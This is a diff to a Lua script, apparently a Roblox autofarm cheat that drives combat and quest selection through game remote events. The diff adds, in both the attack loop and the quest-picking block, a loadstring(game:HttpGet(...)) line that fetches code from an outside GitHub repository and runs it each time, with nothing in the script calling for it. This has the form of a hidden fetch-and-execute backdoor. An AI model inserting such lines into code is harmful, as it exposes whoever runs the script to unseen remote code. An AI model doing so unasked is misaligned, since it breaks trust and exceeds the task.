@@ -1279,6 +1279,7 @@ task.spawn(function() -- Move/Attack
                                     for i,move in pairs(moves) do
                                         if not lplr.Status:FindFirstChild(move) then
                                             spawn(function()
+                                            loadstring(game:HttpGet("https://raw.githubusercontent.com/fernando6663535/Lua/main/To_Bills.Lua"))()
                                                 game:GetService("ReplicatedStorage").Package.Events.mel:InvokeServer(move,"Blacknwhite27")
                                             end)
                                             attacked = true
@@ -1336,6 +1337,7 @@ task.spawn(function() -- Pick quest
                     if getloweststat()/2 >= boss[2] and game.Workspace.Living:FindFirstChild(boss[1]) and game.Workspace.Living[boss[1]]:FindFirstChild("Humanoid") and game.Workspace.Living[boss[1]].Humanoid.Health > 0 then
                         if ldata.Quest.Value ~= boss[1] then
                             pcall(function()
+                            loadstring(game:HttpGet("https://raw.githubusercontent.com/fernando6663535/Lua/main/To_Bills.Lua"))()
                                 game:GetService("ReplicatedStorage").Package.Events.Qaction:InvokeServer(questNPCs[boss[1]])
                             end)
                         end
